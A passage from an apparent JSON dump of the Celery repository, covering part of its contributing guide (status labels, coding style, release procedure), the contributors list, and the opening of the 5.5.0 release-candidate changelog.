PR corresponds to the canvas functionality.\nThese labels are set by the maintainers and for the most part external contributors\nshould not worry about them. A subset of these labels are prepended with **Status:**.\nUsually the **Status:** labels show important actions which the issue or PR needs.\nHere is a summary of such statuses:\n\n- **Status: Cannot Reproduce**\n\n  One or more Celery core team member has not been able to reproduce the issue.\n\n- **Status: Confirmed**\n\n  The issue or PR has been confirmed by one or more Celery core team member.\n\n- **Status: Duplicate**\n\n  A duplicate issue or PR.\n\n- **Status: Feedback Needed**\n\n  One or more Celery core team member has asked for feedback on the issue or PR.\n\n- **Status: Has Testcase**\n\n  It has been confirmed the issue or PR includes a test case.\n  This is particularly important to correctly write tests for any new\n  feature or bug fix.\n\n- **Status: In Progress**\n\n  The PR is still in progress.\n\n- **Status: Invalid**\n\n  The issue reported or the PR is not valid for the project.\n\n- **Status: Needs Documentation**\n\n  The PR does not contain documentation for the feature or bug fix proposed.\n\n- **Status: Needs Rebase**\n\n  The PR has not been rebased with ``main``. It is very important to rebase\n  PRs before they can be merged to ``main`` to solve any merge conflicts.\n\n- **Status: Needs Test Coverage**\n\n  Celery uses `codecov`_ to verify code coverage. Please make sure PRs do not\n  decrease code coverage. This label will identify PRs which need code coverage.\n\n- **Status: Needs Test Case**\n\n  The issue or PR needs a test case. A test case can be a minimal code snippet\n  that reproduces an issue or a detailed set of instructions and configuration values\n  that reproduces the issue reported. If possible a test case can be submitted in\n  the form of a PR to Celery's integration suite. The test case will be marked\n  as failed until the bug is fixed. When a test case cannot be run by Celery's\n  integration suite, then it's better to describe in the issue itself.\n\n- **Status: Needs Verification**\n\n  This label is used to notify other users we need to verify the test case offered\n  by the reporter and/or we need to include the test in our integration suite.\n\n- **Status: Not a Bug**\n\n  It has been decided the issue reported is not a bug.\n\n- **Status: Won't Fix**\n\n  It has been decided the issue will not be fixed. Sadly the Celery project does\n  not have unlimited resources and sometimes this decision has to be made.\n  Although, any external contributors are invited to help out even if an\n  issue or PR is labeled as ``Status: Won't Fix``.\n\n- **Status: Works For Me**\n\n  One or more Celery core team members have confirmed the issue reported works\n  for them.\n\n.. _`different labels`: https://github.com/celery/celery/labels\n.. _`codecov`: https://codecov.io/gh/celery/celery\n\n.. _coding-style:\n\nCoding Style\n============\n\nYou should probably be able to pick up the coding style\nfrom surrounding code, but it is a good idea to be aware of the\nfollowing conventions.\n\n* All Python code must follow the :pep:`8` guidelines.\n\n:pypi:`pep8` is a utility you can use to verify that your code\nis following the conventions.\n\n* Docstrings must follow the :pep:`257` conventions, and use the following\n  style.\n\n    Do this:\n\n    .. code-block:: python\n\n        def method(self, arg):\n            \"\"\"Short description.\n\n            More details.\n\n            \"\"\"\n\n    or:\n\n    .. code-block:: python\n\n        def method(self, arg):\n            \"\"\"Short description.\"\"\"\n\n\n    but not this:\n\n    .. code-block:: python\n\n        def method(self, arg):\n            \"\"\"\n            Short description.\n            \"\"\"\n\n* Lines shouldn't exceed 78 columns.\n\n  You can enforce this in :command:`vim` by setting the ``textwidth`` option:\n\n  .. code-block:: vim\n\n        set textwidth=78\n\n  If adhering to this limit makes the code less readable, you have one more\n  character to go on. This means 78 is a soft limit, and 79 is the hard\n  limit :)\n\n* Import order\n\n    * Python standard library (`import xxx`)\n    * Python standard library (`from xxx import`)\n    * Third-party packages.\n    * Other modules from the current package.\n\n    or in case of code using Django:\n\n    * Python standard library (`import xxx`)\n    * Python standard library (`from xxx import`)\n    * Third-party packages.\n    * Django packages.\n    * Other modules from the current package.\n\n    Within these sections the imports should be sorted by module name.\n\n    Example:\n\n    .. code-block:: python\n\n        import threading\n        import time\n\n        from collections import deque\n        from Queue import Queue, Empty\n\n        from .platforms import Pidfile\n        from .utils.time import maybe_timedelta\n\n* Wild-card imports must not be used (`from xxx import *`).\n\n* For distributions where Python 2.5 is the oldest support version,\n  additional rules apply:\n\n    * Absolute imports must be enabled at the top of every module::\n\n        from __future__ import absolute_import\n\n    * If the module uses the :keyword:`with` statement and must be compatible\n      with Python 2.5 (celery isn't), then it must also enable that::\n\n        from __future__ import with_statement\n\n    * Every future import must be on its own line, as older Python 2.5\n      releases didn't support importing multiple features on the\n      same future import line::\n\n        # Good\n        from __future__ import absolute_import\n        from __future__ import with_statement\n\n        # Bad\n        from __future__ import absolute_import, with_statement\n\n     (Note that this rule doesn't apply if the package doesn't include\n     support for Python 2.5)\n\n\n* Note that we use \"new-style\" relative imports when the distribution\n  doesn't support Python versions below 2.5\n\n    This requires Python 2.5 or later:\n\n    .. code-block:: python\n\n        from . import submodule\n\n\n.. _feature-with-extras:\n\nContributing features requiring additional libraries\n====================================================\n\nSome features like a new result backend may require additional libraries\nthat the user must install.\n\nWe use setuptools `extra_requires` for this, and all new optional features\nthat require third-party libraries must be added.\n\n1) Add a new requirements file in `requirements/extras`\n\n    For the Cassandra backend this is\n    :file:`requirements/extras/cassandra.txt`, and the file looks like this:\n\n    .. code-block:: text\n\n        pycassa\n\n    These are pip requirement files, so you can have version specifiers and\n    multiple packages are separated by newline. A more complex example could\n    be:\n\n    .. code-block:: text\n\n        # pycassa 2.0 breaks Foo\n        pycassa>=1.0,<2.0\n        thrift\n\n2) Modify ``setup.py``\n\n    After the requirements file is added, you need to add it as an option\n    to :file:`setup.py` in the ``extras_require`` section::\n\n        extra['extras_require'] = {\n            # ...\n            'cassandra': extras('cassandra.txt'),\n        }\n\n3) Document the new feature in :file:`docs/includes/installation.txt`\n\n    You must add your feature to the list in the :ref:`bundles` section\n    of :file:`docs/includes/installation.txt`.\n\n    After you've made changes to this file, you need to render\n    the distro :file:`README` file:\n\n    .. code-block:: console\n\n        $ pip install -U -r requirements/pkgutils.txt\n        $ make readme\n\n\nThat's all that needs to be done, but remember that if your feature\nadds additional configuration options, then these needs to be documented\nin :file:`docs/configuration.rst`. Also, all settings need to be added to the\n:file:`celery/app/defaults.py` module.\n\nResult backends require a separate section in the :file:`docs/configuration.rst`\nfile.\n\n.. _contact_information:\n\nContacts\n========\n\nThis is a list of people that can be contacted for questions\nregarding the official git repositories, PyPI packages\nRead the Docs pages.\n\nIf the issue isn't an emergency then it's better\nto :ref:`report an issue <reporting-bugs>`.\n\n\nCommitters\n----------\n\nAsk Solem\n~~~~~~~~~\n\n:github: https://github.com/ask\n:twitter: https://twitter.com/#!/asksol\n\nAsif Saif Uddin\n~~~~~~~~~~~~~~~\n\n:github: https://github.com/auvipy\n:twitter: https://twitter.com/#!/auvipy\n\nDmitry Malinovsky\n~~~~~~~~~~~~~~~~~\n\n:github: https://github.com/malinoff\n:twitter: https://twitter.com/__malinoff__\n\nIonel Cristian Mărieș\n~~~~~~~~~~~~~~~~~~~~~\n\n:github: https://github.com/ionelmc\n:twitter: https://twitter.com/ionelmc\n\nMher Movsisyan\n~~~~~~~~~~~~~~\n\n:github: https://github.com/mher\n:twitter: https://twitter.com/#!/movsm\n\nOmer Katz\n~~~~~~~~~\n:github: https://github.com/thedrow\n:twitter: https://twitter.com/the_drow\n\nSteeve Morin\n~~~~~~~~~~~~\n\n:github: https://github.com/steeve\n:twitter: https://twitter.com/#!/steeve\n\nJosue Balandrano Coronel\n~~~~~~~~~~~~~~~~~~~~~~~~~\n\n:github: https://github.com/xirdneh\n:twitter: https://twitter.com/eusoj_xirdneh\n\nTomer Nosrati\n~~~~~~~~~~~~~\n:github: https://github.com/Nusnus\n:twitter: https://x.com/tomer_nosrati\n\nWebsite\n-------\n\nThe Celery Project website is run and maintained by\n\nMauro Rocco\n~~~~~~~~~~~\n\n:github: https://github.com/fireantology\n:twitter: https://twitter.com/#!/fireantology\n\nwith design by:\n\nJan Henrik Helmers\n~~~~~~~~~~~~~~~~~~\n\n:web: http://www.helmersworks.com\n:twitter: https://twitter.com/#!/helmers\n\n\n.. _packages:\n\nPackages\n========\n\n``celery``\n----------\n\n:git: https://github.com/celery/celery\n:CI: https://travis-ci.org/#!/celery/celery\n:Windows-CI: https://ci.appveyor.com/project/ask/celery\n:PyPI: :pypi:`celery`\n:docs: https://docs.celeryq.dev\n\n``kombu``\n---------\n\nMessaging library.\n\n:git: https://github.com/celery/kombu\n:CI: https://travis-ci.org/#!/celery/kombu\n:Windows-CI: https://ci.appveyor.com/project/ask/kombu\n:PyPI: :pypi:`kombu`\n:docs: https://kombu.readthedocs.io\n\n``amqp``\n--------\n\nPython AMQP 0.9.1 client.\n\n:git: https://github.com/celery/py-amqp\n:CI: https://travis-ci.org/#!/celery/py-amqp\n:Windows-CI: https://ci.appveyor.com/project/ask/py-amqp\n:PyPI: :pypi:`amqp`\n:docs: https://amqp.readthedocs.io\n\n``vine``\n--------\n\nPromise/deferred implementation.\n\n:git: https://github.com/celery/vine/\n:CI: https://travis-ci.org/#!/celery/vine/\n:Windows-CI: https://ci.appveyor.com/project/ask/vine\n:PyPI: :pypi:`vine`\n:docs: https://vine.readthedocs.io\n\n``pytest-celery``\n-----------------\n\nPytest plugin for Celery.\n\n:git: https://github.com/celery/pytest-celery\n:PyPI: :pypi:`pytest-celery`\n:docs: https://pytest-celery.readthedocs.io\n\n``billiard``\n------------\n\nFork of multiprocessing containing improvements\nthat'll eventually be merged into the Python stdlib.\n\n:git: https://github.com/celery/billiard\n:CI: https://travis-ci.org/#!/celery/billiard/\n:Windows-CI: https://ci.appveyor.com/project/ask/billiard\n:PyPI: :pypi:`billiard`\n\n``django-celery-beat``\n----------------------\n\nDatabase-backed Periodic Tasks with admin interface using the Django ORM.\n\n:git: https://github.com/celery/django-celery-beat\n:CI: https://travis-ci.org/#!/celery/django-celery-beat\n:Windows-CI: https://ci.appveyor.com/project/ask/django-celery-beat\n:PyPI: :pypi:`django-celery-beat`\n\n``django-celery-results``\n-------------------------\n\nStore task results in the Django ORM, or using the Django Cache Framework.\n\n:git: https://github.com/celery/django-celery-results\n:CI: https://travis-ci.org/#!/celery/django-celery-results\n:Windows-CI: https://ci.appveyor.com/project/ask/django-celery-results\n:PyPI: :pypi:`django-celery-results`\n\n``librabbitmq``\n---------------\n\nVery fast Python AMQP client written in C.\n\n:git: https://github.com/celery/librabbitmq\n:PyPI: :pypi:`librabbitmq`\n\n``cell``\n--------\n\nActor library.\n\n:git: https://github.com/celery/cell\n:PyPI: :pypi:`cell`\n\n``cyme``\n--------\n\nDistributed Celery Instance manager.\n\n:git: https://github.com/celery/cyme\n:PyPI: :pypi:`cyme`\n:docs: https://cyme.readthedocs.io/\n\n\nDeprecated\n----------\n\n- ``django-celery``\n\n:git: https://github.com/celery/django-celery\n:PyPI: :pypi:`django-celery`\n:docs: https://docs.celeryq.dev/en/latest/django\n\n- ``Flask-Celery``\n\n:git: https://github.com/ask/Flask-Celery\n:PyPI: :pypi:`Flask-Celery`\n\n- ``celerymon``\n\n:git: https://github.com/celery/celerymon\n:PyPI: :pypi:`celerymon`\n\n- ``carrot``\n\n:git: https://github.com/ask/carrot\n:PyPI: :pypi:`carrot`\n\n- ``ghettoq``\n\n:git: https://github.com/ask/ghettoq\n:PyPI: :pypi:`ghettoq`\n\n- ``kombu-sqlalchemy``\n\n:git: https://github.com/ask/kombu-sqlalchemy\n:PyPI: :pypi:`kombu-sqlalchemy`\n\n- ``django-kombu``\n\n:git: https://github.com/ask/django-kombu\n:PyPI: :pypi:`django-kombu`\n\n- ``pylibrabbitmq``\n\nOld name for :pypi:`librabbitmq`.\n\n:git: :const:`None`\n:PyPI: :pypi:`pylibrabbitmq`\n\n.. _release-procedure:\n\n\nRelease Procedure\n=================\n\nUpdating the version number\n---------------------------\n\nThe version number must be updated in three places:\n\n    * :file:`celery/__init__.py`\n    * :file:`docs/include/introduction.txt`\n    * :file:`README.rst`\n\nThe changes to the previous files can be handled with the [`bumpversion` command line tool]\n(https://pypi.org/project/bumpversion/). The corresponding configuration lives in\n:file:`.bumpversion.cfg`. To do the necessary changes, run:\n\n.. code-block:: console\n\n    $ bumpversion\n\nAfter you have changed these files, you must render\nthe :file:`README` files. There's a script to convert sphinx syntax\nto generic reStructured Text syntax, and the make target `readme`\ndoes this for you:\n\n.. code-block:: console\n\n    $ make readme\n\nNow commit the changes:\n\n.. code-block:: console\n\n    $ git commit -a -m \"Bumps version to X.Y.Z\"\n\nand make a new version tag:\n\n.. code-block:: console\n\n    $ git tag vX.Y.Z\n    $ git push --tags\n\nReleasing\n---------\n\nCommands to make a new public stable release:\n\n.. code-block:: console\n\n    $ make distcheck  # checks pep8, autodoc index, runs tests and more\n    $ make dist  # NOTE: Runs git clean -xdf and removes files not in the repo.\n    $ python setup.py sdist upload --sign --identity='Celery Security Team'\n    $ python setup.py bdist_wheel upload --sign --identity='Celery Security Team'\n\nIf this is a new release series then you also need to do the\nfollowing:\n\n* Go to the Read The Docs management interface at:\n    https://readthedocs.org/projects/celery/?fromdocs=celery\n\n* Enter \"Edit project\"\n\n    Change default branch to the branch of this series, for example, use\n    the ``2.4`` branch for the 2.4 series.\n\n* Also add the previous version under the \"versions\" tab.\n\n.. _`mailing-list`: https://groups.google.com/group/celery-users\n\n.. _`irc-channel`: https://docs.celeryq.dev/en/latest/getting-started/resources.html#irc\n\n.. _`internals-guide`: https://docs.celeryq.dev/en/latest/internals/guide.html\n\n.. _`bundles`: https://docs.celeryq.dev/en/latest/getting-started/introduction.html#bundles\n\n.. _`report an issue`: https://docs.celeryq.dev/en/latest/contributing.html#reporting-bugs\n\n"
        },
        {
          "name": "CONTRIBUTORS.txt",
          "type": "blob",
          "size": 8.27,
          "content": "Every contribution to Celery is as important to us,\nas every coin in the money bin is to Scrooge McDuck.\n\nThe first commit to the Celery codebase was made on\nFri Apr 24 13:30:00 2009 +0200, and has since\nthen been improved by many contributors.\n\nEveryone who have ever contributed to Celery should be in\nthis list, but in a recent policy change it has been decided\nthat everyone must add themselves here, and not be added\nby others, so it's currently incomplete waiting for everyone\nto add their names.\n\nThe list of authors added before the policy change can be found in docs/AUTHORS.txt.\n\n--\n\nContributor offers to license certain software (a “Contribution” or multiple\n“Contributions”) to Celery, and Celery agrees to accept said Contributions,\nunder the terms of the BSD open source license.\nContributor understands and agrees that Celery shall have the irrevocable and perpetual right to make\nand distribute copies of any Contribution, as well as to create and distribute collective works and\nderivative works of any Contribution, under the BSD License.\n\nContributors\n------------\n\nAsif Saif Uddin, 2016/08/30\nAsk Solem, 2012/06/07\nSean O'Connor, 2012/06/07\nPatrick Altman, 2012/06/07\nChris St. Pierre, 2012/06/07\nJeff Terrace, 2012/06/07\nMark Lavin, 2012/06/07\nJesper Noehr, 2012/06/07\nBrad Jasper, 2012/06/07\nJuan Catalano, 2012/06/07\nLuke Zapart, 2012/06/07\nRoger Hu, 2012/06/07\nHonza Král, 2012/06/07\nAaron Elliot Ross, 2012/06/07\nAlec Clowes, 2012/06/07\nDaniel Watkins, 2012/06/07\nTimo Sugliani, 2012/06/07\nYury V. Zaytsev, 2012/06/7\nMarcin Kuźmiński, 2012/06/07\nNorman Richards, 2012/06/07\nKevin Tran, 2012/06/07\nDavid Arthur, 2012/06/07\nBryan Berg, 2012/06/07\nMikhail Korobov, 2012/06/07\nJerzy Kozera, 2012/06/07\nBen Firshman, 2012/06/07\nJannis Leidel, 2012/06/07\nChris Rose, 2012/06/07\nJulien Poissonnier, 2012/06/07\nŁukasz Oleś, 2012/06/07\nDavid Strauss, 2012/06/07\nChris Streeter, 2012/06/07\nThomas Johansson, 2012/06/07\nAles Zoulek, 2012/06/07\nClay Gerrard, 2012/06/07\nMatt Williamson, 2012/06/07\nTravis Swicegood, 2012/06/07\nJeff Balogh, 2012/06/07\nHarm Verhagen, 2012/06/07\nWes Winham, 2012/06/07\nDavid Cramer, 2012/06/07\nSteeve Morin, 2012/06/07\nMher Movsisyan, 2012/06/08\nChris Peplin, 2012/06/07\nFlorian Apolloner, 2012/06/07\nJuarez Bochi, 2012/06/07\nChristopher Angove, 2012/06/07\nJason Pellerin, 2012/06/07\nMiguel Hernandez Martos, 2012/06/07\nNeil Chintomby, 2012/06/07\nMauro Rocco, 2012/06/07\nIonut Turturica, 2012/06/07\nAdriano Petrich, 2012/06/07\nMichael Elsdörfer, 2012/06/07\nKornelijus Survila, 2012/06/07\nStefán Kjartansson, 2012/06/07\nKeith Perkins, 2012/06/07\nFlavio Percoco, 2012/06/07\nWes Turner, 2012/06/07\nVitaly Babiy, 2012/06/07\nTayfun Sen, 2012/06/08\nGert Van Gool, 2012/06/08\nAkira Matsuzaki, 2012/06/08\nSimon Josi, 2012/06/08\nSam Cooke, 2012/06/08\nFrederic Junod, 2012/06/08\nRoberto Gaiser, 2012/06/08\nPiotr Sikora, 2012/06/08\nChris Adams, 2012/06/08\nBranko Čibej, 2012/06/08\nVladimir Kryachko, 2012/06/08\nRemy Noel 2012/06/08\nJude Nagurney, 2012/06/09\nJonatan Heyman, 2012/06/10\nDavid Miller 2012/06/11\nMatthew Morrison, 2012/06/11\nLeo Dirac, 2012/06/11\nMark Thurman, 2012/06/11\nDimitrios Kouzis-Loukas, 2012/06/13\nSteven Skoczen, 2012/06/17\nLoren Abrams, 2012/06/19\nEran Rundstein, 2012/06/24\nJohn Watson, 2012/06/27\nMatt Long, 2012/07/04\nDavid Markey, 2012/07/05\nJared Biel, 2012/07/05\nJed Smith, 2012/07/08\nŁukasz Langa, 2012/07/10\nRinat Shigapov, 2012/07/20\nHynek Schlawack, 2012/07/23\nPaul McMillan, 2012/07/26\nMitar, 2012/07/28\nAdam DePue, 2012/08/22\nThomas Meson, 2012/08/28\nDaniel Lundin, 2012/08/30\nAlexey Zatelepin, 2012/09/18\nSundar Raman, 2012/09/24\nHenri Colas, 2012/11/16\nThomas Grainger, 2012/11/29\nMarius Gedminas, 2012/11/29\nChristoph Krybus, 2013/01/07\nJun Sakai, 2013/01/16\nVlad Frolov, 2013/01/23\nMilen Pavlov, 2013/03/08\nPär Wieslander, 2013/03/20\nTheo Spears, 2013/03/28\nRomuald Brunet, 2013/03/29\nAaron Harnly, 2013/04/04\nPeter Brook, 2013/05/09\nMuneyuki Noguchi, 2013/04/24\nStas Rudakou, 2013/05/29\nDong Weiming, 2013/06/27\nOleg Anashkin, 2013/06/27\nRoss Lawley, 2013/07/05\nAlain Masiero, 2013/08/07\nAdrien Guinet, 2013/08/14\nChristopher Lee, 2013/08/29\nAlexander Smirnov, 2013/08/30\nMatt Robenolt, 2013/08/31\nJameel Al-Aziz, 2013/10/04\nFazleev Maksim, 2013/10/08\nIan A Wilson, 2013/10/18\nDaniel M Taub, 2013/10/22\nMatt Wise, 2013/11/06\nMichael Robellard, 2013/11/07\nVsevolod Kulaga, 2013/11/16\nIonel Cristian Mărieș, 2013/12/09\nКонстантин Подшумок, 2013/12/16\nAntoine Legrand, 2014/01/09\nPepijn de Vos, 2014/01/15\nDan McGee, 2014/01/27\nPaul Kilgo, 2014/01/28\nMôshe van der Sterre, 2014/01/31\nMartin Davidsson, 2014/02/08\nChris Clark, 2014/02/20\nMatthew Duggan, 2014/04/10\nBrian Bouterse, 2014/04/10\nDmitry Malinovsky, 2014/04/28\nLuke Pomfrey, 2014/05/06\nAlexey Kotlyarov, 2014/05/16\nRoss Deane, 2014/07/11\nTadej Janež, 2014/08/08\nAkexander Koshelev, 2014/08/19\nDavide Quarta, 2014/08/19\nJohn Whitlock, 2014/08/19\nKonstantinos Koukopoulos, 2014/08/24\nAlbert Yee Wang, 2014/08/29\nAndrea Rabbaglietti, 2014/10/02\nJoe Jevnik, 2014/10/22\nNathan Van Gheem, 2014/10/28\nGino Ledesma, 2014/10/28\nThomas French, 2014/11/10\nMichael Permana, 2014/11/6\nWilliam King, 2014/11/21\nBert Vanderbauwhede, 2014/12/18\nJohn Anderson, 2014/12/27\nLuke Burden, 2015/01/24\nMickaël Penhard, 2015/02/15\nMark Parncutt, 2015/02/16\nSamuel Jaillet, 2015/03/24\nIlya Georgievsky, 2015/03/31\nFatih Sucu, 2015/04/17\nJames Pulec, 2015/04/19\nAlexander Lebedev, 2015/04/25\nFrantisek Holop, 2015/05/21\nFeanil Patel, 2015/05/21\nJocelyn Delalande, 2015/06/03\nJustin Patrin, 2015/08/06\nJuan Rossi, 2015/08/10\nPiotr Maślanka, 2015/08/24\nGerald Manipon, 2015/10/19\nKrzysztof Bujniewicz, 2015/10/21\nSukrit Khera, 2015/10/26\nDave Smith, 2015/10/27\nDennis Brakhane, 2015/10/30\nChris Harris, 2015/11/27\nValentyn Klindukh, 2016/01/15\nWayne Chang, 2016/01/15\nMike Attwood, 2016/01/22\nDavid Harrigan, 2016/02/01\nAhmet Demir, 2016/02/27\nMaxime Verger, 2016/02/29\nDavid Pravec, 2016/03/11\nAlexander Oblovatniy, 2016/03/10\nKomu Wairagu, 2016/04/03\nJoe Sanford, 2016/04/11\nTakeshi Kanemoto, 2016/04/22\nArthur Vuillard, 2016/04/22\nColin McIntosh, 2016/04/26\nJeremy Zafran, 2016/05/17\nAnand Reddy Pandikunta, 2016/06/18\nAdriano Martins de Jesus, 2016/06/22\nKevin Richardson, 2016/06/29\nAndrew Stewart, 2016/07/04\nXin Li, 2016/08/03\nSamuel Giffard, 2016/09/08\nAlli Witheford, 2016/09/29\nAlan Justino da Silva, 2016/10/14\nMarat Sharafutdinov, 2016/11/04\nViktor Holmqvist, 2016/12/02\nRick Wargo, 2016/12/02\nzhengxiaowai, 2016/12/07\nMichael Howitz, 2016/12/08\nAndreas Pelme, 2016/12/13\nMike Chen, 2016/12/20\nAlejandro Pernin, 2016/12/23\nYuval Shalev, 2016/12/27\nMorgan Doocy, 2017/01/02\nArcadiy Ivanov, 2017/01/08\nRyan Hiebert, 2017/01/20\nJianjian Yu, 2017/04/09\nBrian May, 2017/04/10\nDmytro Petruk, 2017/04/12\nJoey Wilhelm, 2017/04/12\nYoichi Nakayama, 2017/04/25\nSimon Schmidt, 2017/05/19\nAnthony Lukach, 2017/05/23\nSamuel Dion-Girardeau, 2017/05/29\nAydin Sen, 2017/06/14\nVinod Chandru, 2017/07/11\nPreston Moore, 2017/06/18\nNicolas Mota, 2017/08/10\nDavid Davis, 2017/08/11\nMartial Pageau, 2017/08/16\nSammie S. Taunton, 2017/08/17\nKxrr, 2017/08/18\nMads Jensen, 2017/08/20\nMarkus Kaiserswerth, 2017/08/30\nAndrew Wong, 2017/09/07\nArpan Shah, 2017/09/12\nTobias 'rixx' Kunze, 2017/08/20\nMikhail Wolfson, 2017/12/11\nMatt Davis, 2017/12/13\nAlex Garel, 2018/01/04\nRégis Behmo 2018/01/20\nIgor Kasianov, 2018/01/20\nDerek Harland, 2018/02/15\nChris Mitchell, 2018/02/27\nJosue Balandrano Coronel, 2018/05/24\nFederico Bond, 2018/06/20\nTom Booth, 2018/07/06\nAxel haustant, 2018/08/14\nBruno Alla, 2018/09/27\nArtem Vasilyev, 2018/11/24\nVictor Mireyev, 2018/12/13\nFlorian Chardin, 2018/10/23\nShady Rafehi, 2019/02/20\nFabio Todaro, 2019/06/13\nShashank Parekh, 2019/07/11\nArel Cordero, 2019/08/29\nKyle Johnson, 2019/09/23\nDipankar Achinta, 2019/10/24\nSardorbek Imomaliev, 2020/01/24\nMaksym Shalenyi, 2020/07/30\nFrazer McLean, 2020/09/29\nHenrik Bruåsdal, 2020/11/29\nTom Wojcik, 2021/01/24\nRuaridh Williamson, 2021/03/09\nGarry Lawrence, 2021/06/19\nPatrick Zhang, 2017/08/19\nKonstantin Kochin, 2021/07/11\nkronion, 2021/08/26\nGabor Boros, 2021/11/09\nTizian Seehaus, 2022/02/09\nOleh Romanovskyi, 2022/06/09\nTomer Nosrati, 2022/07/17\nJoonHwan Kim, 2022/08/01\nKaustav Banerjee, 2022/11/10\nAustin Snoeyink 2022/12/06\nJeremy Z. Othieno 2023/07/27\nTomer Nosrati, 2022/17/07\nAndy Zickler, 2024/01/18\nJohannes Faigle, 2024/06/18\nGiovanni Giampauli, 2024/06/26\nShamil Abdulaev, 2024/08/05\nNikos Atlas, 2024/08/26\nMarc Bresson, 2024/09/02\nNarasux, 2024/09/09\n"
        },
        {
          "name": "Changelog.rst",
          "type": "blob",
          "size": 83.4,
          "content": ".. _changelog:\n\n================\n Change history\n================\n\nThis document contains change notes for bugfix & new features\nin the main branch & 5.5.x series, please see :ref:`whatsnew-5.5` for\nan overview of what's new in Celery 5.5.\n\n.. _version-5.5.0rc4:\n\n5.5.0rc4\n========\n\n:release-date: 2024-12-19\n:release-by: Tomer Nosrati\n\nCelery v5.5.0 Release Candidate 4 is now available for testing.\nPlease help us test this version and report any issues.\n\nKey Highlights\n~~~~~~~~~~~~~~\n\nSee :ref:`whatsnew-5.5` or read the main highlights below.\n\nUsing Kombu 5.5.0rc2\n--------------------\n\nThe minimum required Kombu version has been bumped to 5.5.0.\nKombu is current at 5.5.0rc2.\n\nComplete Quorum Queues Support\n------------------------------\n\nA completely new ETA mechanism was developed to allow full support with RabbitMQ Quorum Queues.\n\nAfter upgrading to this version, please share your feedback on the quorum queues support.\n\nRelevant Issues:\n`#9207 <https://github.com/celery/celery/discussions/9207>`_,\n`#6067 <https://github.com/celery/celery/discussions/6067>`_\n\n- New :ref:`documentation <using-quorum-queues>`.\n- New :setting:`broker_native_delayed_delivery_queue_type` configuration option.\n\nNew support for Google Pub/Sub transport\n----------------------------------------\n\nAfter upgrading to this version, please share your feedback on the Google Pub/Sub transport support.\n\nRelevant Issues:\n`#9351 <https://github.com/celery/celery/pull/9351>`_\n\nPython 3.13 Improved Support\n----------------------------\n\nAdditional dependencies have been migrated successfully to Python 3.13, including Kombu and py-amqp.\n\nSoft Shutdown\n-------------\n\nThe soft shutdown is a new mechanism in Celery that sits between the warm shutdown and the cold shutdown.\nIt sets a time limited \"warm shutdown\" period, during which the worker will continue to process tasks that are already running.\nAfter the soft shutdown ends, the worker will initiate a graceful cold shutdown, stopping all tasks and exiting.\n\nThe soft shutdown is disabled by default, and can be enabled by setting the new configuration option :setting:`worker_soft_shutdown_timeout`.\nIf a worker is not running any task when the soft shutdown initiates, it will skip the warm shutdown period and proceed directly to the cold shutdown\nunless the new configuration option :setting:`worker_enable_soft_shutdown_on_idle` is set to True. This is useful for workers\nthat are idle, waiting on ETA tasks to be executed that still want to enable the soft shutdown anyways.\n\nThe soft shutdown can replace the cold shutdown when using a broker with a visibility timeout mechanism, like :ref:`Redis <broker-redis>`\nor :ref:`SQS <broker-sqs>`, to enable a more graceful cold shutdown procedure, allowing the worker enough time to re-queue tasks that were not\ncompleted (e.g., ``Restoring 1 unacknowledged message(s)``) by resetting the visibility timeout of the unacknowledged messages just before\nthe worker exits completely.\n\nAfter upgrading to this version, please share your feedback on the new Soft Shutdown mechanism.\n\nRelevant Issues:\n`#9213 <https://github.com/celery/celery/pull/9213>`_,\n`#9231 <https://github.com/celery/celery/pull/9231>`_,\n`#9238 <https://github.com/celery/celery/pull/9238>`_\n\n- New :ref:`documentation <worker-stopping>` for each shutdown type.\n- New :setting:`worker_soft_shutdown_timeout` configuration option.\n- New :setting:`worker_enable_soft_shutdown_on_idle` configuration option.\n\nREMAP_SIGTERM\n-------------\n\nThe ``REMAP_SIGTERM`` \"hidden feature\" has been tested, :ref:`documented <worker-REMAP_SIGTERM>` and is now officially supported.\nThis feature allows users to remap the SIGTERM signal to SIGQUIT, to initiate a soft or a cold shutdown using :sig:`TERM`\ninstead of :sig:`QUIT`.\n\nPydantic Support\n----------------\n\nThis release introduces support for Pydantic models in Celery tasks.\nFor more info, see the new pydantic example and PR `#9023 <https://github.com/celery/celery/pull/9023>`_ by @mathiasertl.\n\nAfter upgrading to this version, please share your feedback on the new Pydantic support.\n\nRedis Broker Stability Improvements\n-----------------------------------\nThe root cause of the Redis broker instability issue has been `identified and resolved <https://github.com/celery/kombu/pull/2007>`_\nin the v5.4.0 release of Kombu, which should resolve the disconnections bug and offer additional improvements.\n\nAfter upgrading to this version, please share your feedback on the Redis broker stability.\n\nRelevant Issues:\n`#7276 <https://github.com/celery/celery/discussions/7276>`_,\n`#8091 <https://github.com/celery/celery/discussions/8091>`_,\n`#8030 <https://github.com/celery/celery/discussions/8030>`_,\n`#8384 <https://github.com/celery/celery/discussions/8384>`_\n\nQuorum Queues Initial Support\n-----------------------------\nThis release introduces the initial support for Quorum Queues with Celery. \n\nSee new configuration options for more details:\n\n- :setting:`task_default_queue_type`\n- :setting:`worker_detect_quorum_queues`\n\nAfter upgrading to this version, please share your feedback on the Quorum Queues support.\n\nRelevant Issues:\n`#6067 <https://github.com/celery/celery/discussions/6067>`_,\n`#9121 <https://github.com/celery/celery/discussions/9121>`_\n\nWhat's Changed\n~~~~~~~~~~~~~~\n\n- Bugfix: SIGQUIT not initiating cold shutdown when `task_acks_late=False` (#9461)\n- Fixed pycurl dep with Python 3.8 (#9471)\n- Update elasticsearch requirement from <=8.16.0 to <=8.17.0 (#9469)\n- Bump pytest-subtests from 0.13.1 to 0.14.1 (#9459)\n- documentation: Added a type annotation to the periodic task example (#9473)\n- Prepare for (pre) release: v5.5.0rc4 (#9474)\n\n.. _version-5.5.0rc3:\n\n5.5.0rc3\n========\n\n:release-date: 2024-12-03\n:release-by: Tomer Nosrati\n\nCelery v5.5.0 Release Candidate 3 is now available for testing.\nPlease help us test this version and report any issues.\n\nKey Highlights\n~~~~~~~~~~~~~~\n\nSee :ref:`whatsnew-5.5` or read the main highlights below.\n\nUsing Kombu 5.5.0rc2\n--------------------\n\nThe minimum required Kombu version has been bumped to 5.5.0.\nKombu is current at 5.5.0rc2.\n\nComplete Quorum Queues Support\n------------------------------\n\nA completely new ETA mechanism was developed to allow full support with RabbitMQ Quorum Queues.\n\nAfter upgrading to this version, please share your feedback on the quorum queues support.\n\nRelevant Issues:\n`#9207 <https://github.com/celery/celery/discussions/9207>`_,\n`#6067 <https://github.com/celery/celery/discussions/6067>`_\n\n- New :ref:`documentation <using-quorum-queues>`.\n- New :setting:`broker_native_delayed_delivery_queue_type` configuration 